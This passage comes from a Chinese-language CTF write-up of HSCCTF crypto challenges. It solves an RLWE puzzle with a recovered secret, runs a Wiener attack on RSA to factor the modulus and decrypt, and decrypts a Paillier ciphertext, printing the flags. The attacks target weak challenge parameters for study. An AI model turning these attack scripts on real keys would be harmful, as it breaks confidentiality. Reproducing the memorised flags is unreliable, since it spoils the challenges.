422980376119787520, 3401510714240147456, 3024926897503240192, 3504641379026477056, 2686993749796929536, 4084804987293286400, 1949654215988994048, 2949577339713200128, 2514172581835300864, 614361226066452480, 1560522408220647424, 1215782736092413952, 1705607337158410240, 3789095360729792512, 126768310879952896, 3564560282876477440, 4112635401656336384, 488963213586022400, 3263989278014881792, 1190526290525741056, 3726804923972673536, 2773020963465314304, 2008550394681090048, 2877753734522249216, 3318721688589254656, 2685195110085615616, 2120287225013829632, 2837075008393977856, 680647261446750208, 2672034759831756800, 586790221783564288, 4413791420559310848, 753748175057453056, 4156435215025135616, 1753634903657668608, 3868573500772638720, 1065381465124585472, 1951729611177713664, 833463289401663488, 3083559584672243712, 2453364017450852352, 3187954181254758400, 2701962603281113088, 1657135743981748224, 3393942972234113024, 3224375546132267008, 1637663670848045056, 2226464092285288448, 3426678970486587392, 3746864906767974400, 892187878069846016, 1566105953383768064, 1841796609436766208, 102854404605427712, 1384852880673484800, 2187150610629812224, 3960839367218393088, 798293770690805760, 172119736121323520, 2434320282093170688, 3398926147058458624, 858963714965422080, 3371154991043334144, 1537312801335345152, 2963315646558453760, 4058550201296797696, 1544831164568528896, 4296983781331357696, 3597399236973740032, 1172234645379473408, 1811007296491237376, 1364782914640955392, 1942828798540959744, 1312644494190576640, 540671172853423104, 2521681537802540032, 3678999552996606976, 3522586936321518592, 3355286245326997504, 1724989423167225856, 2857616461138001920, 3550411157752463360]v = [3004075223514152960, 375766571298967040, 3918175633582001664, 298998053399571840, 4539733962165100544, 3415675319003214848, 557497174827461120, 1187181217327680512, 42761045408950272, 4539692406094923776, 3474777010512353280, 807990709249906688, 4401927180657766400, 628439373724332032, 3552565694197467136, 1229559664627433472, 2735485480783970304, 340251515454152704, 535029869298274304, 1089634905489248256, 1745435675342262272, 2211405319829864448, 3166387633265565696, 3356595592575791104, 811586262403354624, 1658544963444764672, 2801381922146680832, 1906405005677551616, 2764661089781948416, 348852661152833536, 2843732326950182912, 3655220640882900992, 2735228541582770176, 984245520265568256, 847631674608009216, 4278557074339209216, 354445030770749440, 552426514839019520, 3037890003690143744, 3845527152479436800, 686613871844605952, 1987014853275738112, 129221415412514816, 884028654840045568, 893161048767537152, 4428861422755028992, 1977654893495033856, 2683055322869915648, 4466344498597339136, 2820131774980661248, 2105607478169853952, 768444766180638720, 212987987936600064, 1576117523911901184, 1650389830627762176, 1915750840791851008, 4109009172913405952, 2218053892260061184, 3863963349465956352, 2990430210085863424, 1274030477779271680, 1711547929466978304, 1157679433574768640, 156097645996949504, 3695677787747401728, 4322888783310766080, 4546024412016992256, 2655974462028947456, 1604656974594400256, 2045021548923273216, 3161689730583207936, 8339332591755263, 2341948229963612160, 3607706207127453696, 469234496887414784, 973715854261501952, 789210633607102464, 4424949506055979008, 1542517731370860544, 182468406585786368, 1807090988320792576, 1850374377172516864, 2618527682038956032, 1262867559425187840, 938222240300924928, 4591256432328728576, 2044671823654682624, 3467964150293766144, 79543117595951104, 2185630104198291456, 3728244444110430208, 156056289984327680, 4390349499275018240, 1751182369256157184, 2162985531302232064, 2761554017168584704, 2829764058526203904, 2028689816016191488, 146286463995781120, 3720834471976288256, 2917463735459491840, 4566476477728677888, 3722002688823242752, 4245856959119122432, 3425954365963665408, 3618936531494342656, 3695636186696466432, 1423352273706041344, 158921080583421952, 4351926341975711744, 3376292832678187008, 3295795181429579776, 3267875754319810560, 2363850527793784832, 888488262224822272, 1097387081646508032, 3686827109357189120, 297511993689784320, 3698586652027076608, 1126524981060736000, 1227462499250052096, 195965752955788032, 378621325977167872, 4568860371418834944, 3806982850127191040, 2330191690590402560, 965690431040995328, 2254601344237207552]g = [1271385667288255999, 3597939031086288160, 948720385886874982, 3730034896312885091, 155961058571645646, 873298702409407364, 3695415802847080551, 3935805697420664465, 303427777773526115, 2121504102169723388, 3117842710535023914, 2004730725267082784, 315298886702225235, 711790101004272712, 3469726824196756845, 3649946521480214795, 4269586158067475466, 1607685984041888423, 1866766258134518609, 4115571819844332380, 2381299916655519619, 2208948036365614734, 1946214530009282102, 330799912617809735, 3460498231343524429, 2694359423578749492, 793704330311549271, 1491532600134534859, 1606672420502700650, 561106526228105342, 1105025457886824442, 1443932433209975334, 4240908184445005305, 1954646486670721382, 4227369777555389059, 1563814260527576306, 771217858163031033, 1280424786084049063, 303853418224126180, 181918673882271714, 2212581027220765469, 2111888312694611250, 3581354821166105988, 1429049683930421764, 1357441041735699015, 3553280165847887597, 869489768651033960, 1107714765447012644, 2910143081602408601, 1433461290183315706, 3240132019514117541, 2465292834002904411, 1334470694725903257, 3156578894981065904, 35185442949043438, 645993467993501426, 1352915688916657829, 1521946784078789166, 2639858512187877401, 4315064694485922395, 3953315792354490874, 1587769214913102261, 3912000075342935904, 1887499577531299413, 309657057763429254, 769590223035802807, 4361036733963754384, 1446528785602732156, 1205711736426995533, 3683188791797133788, 921287773622604679, 3591274357626650529, 2745859155549230842, 4491978210538609848, 2444128709624329128, 1403888264551474491, 4377727165055311964, 1507498290240201527, 2952796830041690744, 1642562262970195060, 2847743992975447391, 4164239208310834247, 1967003682977431435, 2575799088251274004, 156708464748056204, 2403917842083313594, 55721043545237639, 239916744182811448, 134638877854791156, 76687455444928683, 3051612621194354938, 4253947515818696559, 392166402534779315, 5415521347314633, 1816697745794261287, 2282876916808180261, 3667412627019328976, 4211876289328416715, 1647128252024708114, 3721877072126461741, 2297068963395433648, 398583411660274597, 3562855580894975650, 1322989240042277117, 3551729861626536144, 2816759739903316271, 2629395545611893101, 1799561289667084873, 2629410111371391637, 1398369600901640698, 447266788926484707, 405213767544537836, 3014220918160576578, 747208265285548041, 1727187447678753569, 3063564852472463780, 1502638600503176791, 3284205888928186113, 3412854446691461073, 3937011809364193960, 1208514509487198642, 3063044796627572289, 2532417142719581087, 375928502591586817, 2839325684818922862, 4472409225244809142, 1384186637673587546, 1680318030162086049]t = [3482937270284373504, 3729542463939501056, 1354530592839269376, 2340035975483411456, 3318144666530505728, 4321971466042776576, 4107840020098758656, 2600042509314867200, 3185315495632337920, 2510425761632839680, 3758844697217568768, 1813627045100445696, 1035634427310004224, 1650895865179787264, 931858574122051584, 3821738968282525696, 751354306590687232, 812159733109825536, 1984846083975063552, 426674528748978176, 1786129270688538624, 53204613942820864, 4207648582990901248, 2441413890227052544, 4573249524143439872, 2901255116891488256, 3331287389413953536, 1594453621617430528, 7636565623463936, 3261865719383670784, 3211543945355886592, 4414864510393499648, 1781787468450406400, 4381257290165919744, 1683943310183464960, 1618102318685454336, 3082727664554508288, 1284750602156802048, 4536273674447527936, 4224428964375134208, 1990811212107251712, 220641709431201792, 56727929599156224, 1394394833783595008, 474539825790402560, 2367070412709519360, 86013256530493440, 3983263247386468352, 4488230536002330624, 1131832099054157824, 4470326732790874112, 2361104703887433728, 1850267988673478656, 519014833878171648, 2447115942472581120, 2567048274520276992, 3409815404144214016, 2569012418791473152, 2239861171203006464, 3207035079062069248, 1423032481934245888, 3660676895628648448, 3197924030326439936, 2173721402472767488, 1836499846562930688, 1193190307175825408, 2757965850888388608, 3833547905923039232, 113362523505639424, 2095507640221974528, 695818728283136000, 2746136108677742592, 80271849461956608, 544596706215608320, 857894362373431296, 1801819582386577408, 2748888436946362368, 1760827740054806528, 2544591920627023872, 4324861829346312192, 3073160513540464640, 3260750497480876032, 1268136159796920320, 2738758060057362432, 460370852221685760, 3694812482865025024, 674485732026892288, 31827325234905088, 1076067066569760768, 3538749128687951872, 4553745898606747648, 3332219178735149056, 329835532944998400, 4576690061027602432, 3023286444576161792, 1797946474203955200, 4558389623053447168, 1790588264296259584, 3017170271014150144, 991463616551034880, 1940023178234544128, 3414390445152993280, 644333657859764224, 3692106158122917888, 3167684436092710912, 789204772426006528, 4353661356398166016, 2000540208800374784, 3942168043465134080, 3332450567729246208, 2627875622523490304, 9371534919516160, 848644069081235456, 2192689498702295040, 907016265148577792, 2645935549696630784, 2590866188404383744, 3750676748846913536, 3694849270404139008, 4268369840164233216, 3556945000413347840, 1995615102316576768, 4445424004994387968, 2929133498761163776, 2462149674675616768, 741748174115656704, 39754566828455680, 4477497218304360448]jjgqJn00BoV2m68QERWUCmah8h86UJERRsVhfzEzy9hBwi0GJ5MyEzBCQS5r0yr7GrdM5d0ptnBWLzfywakvSlRJvex1efrtHiDVNo4WQZjopk4N3RFi4D&#x27;&#x27;&#x27; 先解最后的base，base62-base32-base58-base64-base62解得 wo_shi_yhhhh_de_fen_si。 用此作为密码解压得到一个 s.png，提取像素值： 1234567891011from PIL import Imageimg = Image.open(&#x27;YOUQU/s.png&#x27;)width , height = img.sizes = []for i in range(0,width): for j in range(0,height): tmp = img.getpixel((i,j)) s.append(tmp)print(s)# s = [1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1] 加密部分是一个RLWE，定义了一个多项式商环 $F_p[x]=\\cfrac{Z_p[x]}{f(x)}$，随机列表为商环上的多项式系数列表。 加密函数 $t(x) \\equiv -s(x)g(x)+e_1(x) \\pmod p$ $w(x) \\equiv t(x)r(x)+e_2(x)+d\\cdot m(x) \\pmod p$ $v(x) \\equiv g(x)r(x)+e_3(x) \\pmod p$ 已知私钥 $s(x)$，则 $w+s\\cdot v=(t\\cdot r+e_2+d\\cdot m)+s(g\\cdot r+e_3)=-s\\cdot g\\cdot r+e_1\\cdot r+e_2+d\\cdot m+s\\cdot g\\cdot r+s\\cdot e_3=d\\cdot m+(e_1\\cdot r+e_2+s\\cdot e_3)$ 可以发现，后面的 $e\\cdot r+e_2+s\\cdot e_3$ 仍然是个小噪声， 有 $(w+s\\cdot v) \\bmod d = m$ 噪声可能满足 $e_1\\cdot r+e_2+s\\cdot e_3&lt;0$ ，为负值的时候，会出现 $(w+s\\cdot v) \\bmod d = m&lt;1$ ，需对应处理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import numpy as npfrom numpy.polynomial import polynomial as polyfrom Crypto.Util.number import *def mul(x, y, z, mod): init_poly = poly.polymul(x, y) res_poly = poly.polydiv(init_poly % z, mod)[1] % z return np.int64(np.round(res_poly))def add(x, y, z, mod): init_poly = poly.polyadd(x, y) res_poly = poly.polydiv(init_poly % z, mod)[1] % z return np.int64(np.round(res_poly))def q2(lenth1): return np.random.randint(0, 2, lenth1, dtype=np.int64)def qz(z, lenth1): return np.random.randint(0, z, lenth1, dtype=np.int64)def guess(lenth1): return np.int64(np.random.normal(0, 2, size=lenth1))def jlkey(lenth1, z, mod): s = q2(lenth1) g = qz(z, lenth1) e1 = guess(lenth1) t = add(mul(g, s, z, mod), e1, z, mod) key = [g, t, s] return keydef jl(key, length1, n, p, mod, msg): jlm = [] mm = hex(msg)[2:] for i in range(0, len(mm)): jlm.append(ord(mm[i])) m = np.array(jlm + [0] * (length1 - len(jlm)), dtype=np.int64) % p d = n // p dm = d * m % n e2 = guess(length1) e3 = guess(length1) r = q2(length1) g = key[0] t = key[1] w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod) v = add(mul(g, r, n, mod), e3, n, mod) c = [w, v] return co = 128n = 2 ** 62p = 2 ** 32mod = np.array([1] + [0] * (o - 1) + [1])w = [4456121292753321984, 2695388220323384832, 1125798304404134912, 1389165333028469760, 3720515311443086336, 1806160162087117824, 1710165564223285248, 3854525633894178816, 4160032803226148864, 3223993978734964736, 188029029972998144, 2283288149728718848, 178098730553155584, 400166020473782272, 4426677526375129088, 1768526165797007360, 4596103848246980608, 3143341953117548544, 4113813229295153152, 1444787342796136448, 1749143783191330816, 601663717837410304, 1976180375223943168, 899486064067571712, 2467702122158211072, 1442313048691163136, 2977506408218411008, 1106991111199326208, 844904722420957184, 1013497211561496576, 4250614525386129408, 1677797764964532224, 4212901529405988864, 2561734724771299328, 1890807629146202112, 951039123411230720, 881428262835757056, 514344970914586624, 3072465238399721472, 1294633561516974080, 4471068621313253376, 2978038764905480192, 1256294011046658048, 2885789906784919552, 1808546586690191360, 3846883621647482880, 422980376119787520, 3401510714240147456, 3024926897503240192, 3504641379026477056, 2686993749796929536, 4084804987293286400, 1949654215988994048, 2949577339713200128, 2514172581835300864, 614361226066452480, 1560522408220647424, 1215782736092413952, 1705607337158410240, 3789095360729792512, 126768310879952896, 3564560282876477440, 4112635401656336384, 488963213586022400, 3263989278014881792, 1190526290525741056, 3726804923972673536, 2773020963465314304, 2008550394681090048, 2877753734522249216, 3318721688589254656, 2685195110085615616, 2120287225013829632, 2837075008393977856, 680647261446750208, 2672034759831756800, 586790221783564288, 4413791420559310848, 753748175057453056, 4156435215025135616, 1753634903657668608, 3868573500772638720, 1065381465124585472, 1951729611177713664, 833463289401663488, 3083559584672243712, 2453364017450852352, 3187954181254758400, 2701962603281113088, 1657135743981748224, 3393942972234113024, 3224375546132267008, 1637663670848045056, 2226464092285288448, 3426678970486587392, 3746864906767974400, 892187878069846016, 1566105953383768064, 1841796609436766208, 102854404605427712, 1384852880673484800, 2187150610629812224, 3960839367218393088, 798293770690805760, 172119736121323520, 2434320282093170688, 3398926147058458624, 858963714965422080, 3371154991043334144, 1537312801335345152, 2963315646558453760, 4058550201296797696, 1544831164568528896, 4296983781331357696, 3597399236973740032, 1172234645379473408, 1811007296491237376, 1364782914640955392, 1942828798540959744, 1312644494190576640, 540671172853423104, 2521681537802540032, 3678999552996606976, 3522586936321518592, 3355286245326997504, 1724989423167225856, 2857616461138001920, 3550411157752463360]v = [3004075223514152960, 375766571298967040, 3918175633582001664, 298998053399571840, 4539733962165100544, 3415675319003214848, 557497174827461120, 1187181217327680512, 42761045408950272, 4539692406094923776, 3474777010512353280, 807990709249906688, 4401927180657766400, 628439373724332032, 3552565694197467136, 1229559664627433472, 2735485480783970304, 340251515454152704, 535029869298274304, 1089634905489248256, 1745435675342262272, 2211405319829864448, 3166387633265565696, 3356595592575791104, 811586262403354624, 1658544963444764672, 2801381922146680832, 1906405005677551616, 2764661089781948416, 348852661152833536, 2843732326950182912, 3655220640882900992, 2735228541582770176, 984245520265568256, 847631674608009216, 4278557074339209216, 354445030770749440, 552426514839019520, 3037890003690143744, 3845527152479436800, 686613871844605952, 1987014853275738112, 129221415412514816, 884028654840045568, 893161048767537152, 4428861422755028992, 1977654893495033856, 2683055322869915648, 4466344498597339136, 2820131774980661248, 2105607478169853952, 768444766180638720, 212987987936600064, 1576117523911901184, 1650389830627762176, 1915750840791851008, 4109009172913405952, 2218053892260061184, 3863963349465956352, 2990430210085863424, 1274030477779271680, 1711547929466978304, 1157679433574768640, 156097645996949504, 3695677787747401728, 4322888783310766080, 4546024412016992256, 2655974462028947456, 1604656974594400256, 2045021548923273216, 3161689730583207936, 8339332591755263, 2341948229963612160, 3607706207127453696, 469234496887414784, 973715854261501952, 789210633607102464, 4424949506055979008, 1542517731370860544, 182468406585786368, 1807090988320792576, 1850374377172516864, 2618527682038956032, 1262867559425187840, 938222240300924928, 4591256432328728576, 2044671823654682624, 3467964150293766144, 79543117595951104, 2185630104198291456, 3728244444110430208, 156056289984327680, 4390349499275018240, 1751182369256157184, 2162985531302232064, 2761554017168584704, 2829764058526203904, 2028689816016191488, 146286463995781120, 3720834471976288256, 2917463735459491840, 4566476477728677888, 3722002688823242752, 4245856959119122432, 3425954365963665408, 3618936531494342656, 3695636186696466432, 1423352273706041344, 158921080583421952, 4351926341975711744, 3376292832678187008, 3295795181429579776, 3267875754319810560, 2363850527793784832, 888488262224822272, 1097387081646508032, 3686827109357189120, 297511993689784320, 3698586652027076608, 1126524981060736000, 1227462499250052096, 195965752955788032, 378621325977167872, 4568860371418834944, 3806982850127191040, 2330191690590402560, 965690431040995328, 2254601344237207552]g = [1271385667288255999, 3597939031086288160, 948720385886874982, 3730034896312885091, 155961058571645646, 873298702409407364, 3695415802847080551, 3935805697420664465, 303427777773526115, 2121504102169723388, 3117842710535023914, 2004730725267082784, 315298886702225235, 711790101004272712, 3469726824196756845, 3649946521480214795, 4269586158067475466, 1607685984041888423, 1866766258134518609, 4115571819844332380, 2381299916655519619, 2208948036365614734, 1946214530009282102, 330799912617809735, 3460498231343524429, 2694359423578749492, 793704330311549271, 1491532600134534859, 1606672420502700650, 561106526228105342, 1105025457886824442, 1443932433209975334, 4240908184445005305, 1954646486670721382, 4227369777555389059, 1563814260527576306, 771217858163031033, 1280424786084049063, 303853418224126180, 181918673882271714, 2212581027220765469, 2111888312694611250, 3581354821166105988, 1429049683930421764, 1357441041735699015, 3553280165847887597, 869489768651033960, 1107714765447012644, 2910143081602408601, 1433461290183315706, 3240132019514117541, 2465292834002904411, 1334470694725903257, 3156578894981065904, 35185442949043438, 645993467993501426, 1352915688916657829, 1521946784078789166, 2639858512187877401, 4315064694485922395, 3953315792354490874, 1587769214913102261, 3912000075342935904, 1887499577531299413, 309657057763429254, 769590223035802807, 4361036733963754384, 1446528785602732156, 1205711736426995533, 3683188791797133788, 921287773622604679, 3591274357626650529, 2745859155549230842, 4491978210538609848, 2444128709624329128, 1403888264551474491, 4377727165055311964, 1507498290240201527, 2952796830041690744, 1642562262970195060, 2847743992975447391, 4164239208310834247, 1967003682977431435, 2575799088251274004, 156708464748056204, 2403917842083313594, 55721043545237639, 239916744182811448, 134638877854791156, 76687455444928683, 3051612621194354938, 4253947515818696559, 392166402534779315, 5415521347314633, 1816697745794261287, 2282876916808180261, 3667412627019328976, 4211876289328416715, 1647128252024708114, 3721877072126461741, 2297068963395433648, 398583411660274597, 3562855580894975650, 1322989240042277117, 3551729861626536144, 2816759739903316271, 2629395545611893101, 1799561289667084873, 2629410111371391637, 1398369600901640698, 447266788926484707, 405213767544537836, 3014220918160576578, 747208265285548041, 1727187447678753569, 3063564852472463780, 1502638600503176791, 3284205888928186113, 3412854446691461073, 3937011809364193960, 1208514509487198642, 3063044796627572289, 2532417142719581087, 375928502591586817, 2839325684818922862, 4472409225244809142, 1384186637673587546, 1680318030162086049]t = [3482937270284373504, 3729542463939501056, 1354530592839269376, 2340035975483411456, 3318144666530505728, 4321971466042776576, 4107840020098758656, 2600042509314867200, 3185315495632337920, 2510425761632839680, 3758844697217568768, 1813627045100445696, 1035634427310004224, 1650895865179787264, 931858574122051584, 3821738968282525696, 751354306590687232, 812159733109825536, 1984846083975063552, 426674528748978176, 1786129270688538624, 53204613942820864, 4207648582990901248, 2441413890227052544, 4573249524143439872, 2901255116891488256, 3331287389413953536, 1594453621617430528, 7636565623463936, 3261865719383670784, 3211543945355886592, 4414864510393499648, 1781787468450406400, 4381257290165919744, 1683943310183464960, 1618102318685454336, 3082727664554508288, 1284750602156802048, 4536273674447527936, 4224428964375134208, 1990811212107251712, 220641709431201792, 56727929599156224, 1394394833783595008, 474539825790402560, 2367070412709519360, 86013256530493440, 3983263247386468352, 4488230536002330624, 1131832099054157824, 4470326732790874112, 2361104703887433728, 1850267988673478656, 519014833878171648, 2447115942472581120, 2567048274520276992, 3409815404144214016, 2569012418791473152, 2239861171203006464, 3207035079062069248, 1423032481934245888, 3660676895628648448, 3197924030326439936, 2173721402472767488, 1836499846562930688, 1193190307175825408, 2757965850888388608, 3833547905923039232, 113362523505639424, 2095507640221974528, 695818728283136000, 2746136108677742592, 80271849461956608, 544596706215608320, 857894362373431296, 1801819582386577408, 2748888436946362368, 1760827740054806528, 2544591920627023872, 4324861829346312192, 3073160513540464640, 3260750497480876032, 1268136159796920320, 2738758060057362432, 460370852221685760, 3694812482865025024, 674485732026892288, 31827325234905088, 1076067066569760768, 3538749128687951872, 4553745898606747648, 3332219178735149056, 329835532944998400, 4576690061027602432, 3023286444576161792, 1797946474203955200, 4558389623053447168, 1790588264296259584, 3017170271014150144, 991463616551034880, 1940023178234544128, 3414390445152993280, 644333657859764224, 3692106158122917888, 3167684436092710912, 789204772426006528, 4353661356398166016, 2000540208800374784, 3942168043465134080, 3332450567729246208, 2627875622523490304, 9371534919516160, 848644069081235456, 2192689498702295040, 907016265148577792, 2645935549696630784, 2590866188404383744, 3750676748846913536, 3694849270404139008, 4268369840164233216, 3556945000413347840, 1995615102316576768, 4445424004994387968, 2929133498761163776, 2462149674675616768, 741748174115656704, 39754566828455680, 4477497218304360448]s = [1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1]x = [(n-k)%n for k in v]res = add(w,mul(s,x,n,mod),n,mod)t1 = (res//(2**30))[:76]t2 = (res%(2**30))[:76]c = &#x27;&#x27;for i in range(len(t1)): if t2[i] &gt; 1000000: c += chr(t1[i]+1) else: c += chr(t1[i])print(long_to_bytes(int(c,16)))# b&#x27;HSCCTF&#123;vb6fh8gd7fy87jht7fgyt7g89gb9dn&#125;&#x27; ​ RSATEST给了公钥文件和密文，在线解析公钥得到 $n,e$，wiener attack求 $d$： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162def rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)e = 28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013n = 82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return dd = crack_rsa(e, n)print(d)# 11883451304899715537 根据 $n,e,d$ 分解 $p,q$： 123456789101112131415161718192021222324252627import randomimport gmpy2def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p) e = 28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013n = 82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729c = 0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296d=11883451304899715537p, q = divide_pq(e, d, n)print(f&#x27;p = &#123;p&#125;&#x27;)print(f&#x27;q = &#123;q&#125;&#x27;)# p = 8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671# q = 9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399 生成私钥文件： 12345678910111213141516from Crypto.PublicKey import RSAe=28590331496425613818981991777617535857151582651120346436859967760844419275658771430821058722393674433618893115968176611013590439492663850993790177381059077045197086133940118402088554088073121591402095323966107722485647643452801806511583327361664114727935171402256611877627071996643841223356362367747555753013n=82016816963574560365976489524199243050120748716806912567895093731022264392235286524041630435256965141365061465268083316572087612155218061280174438822024011254230300135794845491207820824129566975766207833561478897150955561714805950254000266078855648956964973181825856857736088834707915779351726709234357344729c=0x1d1d98935d8bc395049b978b53ab72fc2c722f30b84bbf6c2bf3473320d040525bce59094840b229cf1fee0332c9dbcfc9cc07bf0841d2ec5f25b3f6a2868db433aca742d1e17a7b89f94412a77ea2f0ee3c30b53e250f77c44fd0e9c47bdfbfaa6dfe3f987409e9e6501962bf425cb686b570f922b843e30b4e96521c2dd296d=11883451304899715537p = 8281403040977025531549820722276265064745565654568438822912387430707467937623490534629221470348100185977195507167386055422519226694536400000080279834237671q = 9903734494958037799680839753815171083006157728210189116724935884147895459864893196164405513869856559603118560765385175174916229249053756596318108626734399rsa_components = (n, e, d, p, q)myrsa = RSA.construct(rsa_components)private = open(&#x27;private.pem&#x27;, &#x27;wb&#x27;)private.write(myrsa.exportKey())private.close() openssl解密： openssl rsautl -decrypt -inkey private.pem -in output.txt 输出：09C96E1A3ACC46E3C9F7603EB592FE4A flag：HSCCTF&#123;09C96E1A3ACC46E3C9F7603EB592FE4A&#125; ​ STAR_CHASING_DIARY crypto!图片? 12345678910111213141516171819# key.pyfrom Crypto.Util.number import *from random import *p = getPrime(512)q = getPrime(512)print(&quot;p =&quot;, p)print(&quot;q =&quot;, q)n = p * qkey = &#x27;********************&#x27;m = bytes_to_long(key.encode())assert m.bit_length() &lt; 300r = randint(1, n)c = (pow(n + 1, m, n * n) * pow(r, n, n * n)) % (n * n)print(&quot;c =&quot;, c)# p = 7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639# q = 11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299# c = 768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162 1234567891011121314151617181920212223242526272829303132333435# task.py&quot;&quot;&quot;小肖在学习的过程中,了解到了一种填充图片的算法,兴奋的她用它和RSA加密了偶像的照片,但是在传输的过程中丢失了一部分加密算法,你能帮她补全,并解出来偶像的照片吗?&quot;&quot;&quot;from PIL import Imagedef f(n, x, y): if n == 0: return 1 m = 1 &lt;&lt; (n - 1)j = 128mm = []for i in range(1, 257): for s in range(1, 257): mm.append(f(j, i, s) - 1)img = Image.open(&#x27;flag.jpg&#x27;)pixels = list(img.getdata())data = [pixel for pixel in pixels]img = Image.open(&#x27;key.png&#x27;)pixels = list(img.getdata())png_key = [pixel for pixel in pixels]enc = [0] * 65536for i in range(65536): enc[i] = data[mm[i]]for s in range(65536): enc[s] = enc[s] ^ png_key[s]image = Image.new(&#x27;L&#x27;, (256, 256))image.putdata(enc)image.save(&#x27;enc.jpg&#x27;) 先看 key.py，Paillier密码系统： 1234567891011121314p = 7828612943367317778189697443061863547768704021648982642807960201410438190347546379219450386530108335470584219657007036386835647156694512102467911388214639q = 11560196429251786803557082533869761370530605728500211999842201987445533038949033226473164866960007192683170489064961432891988337343103657552186800680461299c = 768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162n = p*qdef L(x,n): return (x-1)//nlamb = (p-1)*(q-1)miu = inverse_mod(lamb,n)m = (L(pow(c,lamb,n**2),n)*miu)%nprint(bytes.fromhex(hex(m)[2:]))b&#x27;HSCCTF&#123;this_is_a_fake_flag&#125;&#x27; 用密码 HSCCTF&#123;this_is_a_fake_flag&#125; 解压得到 key.png。 再看 task.py，f() 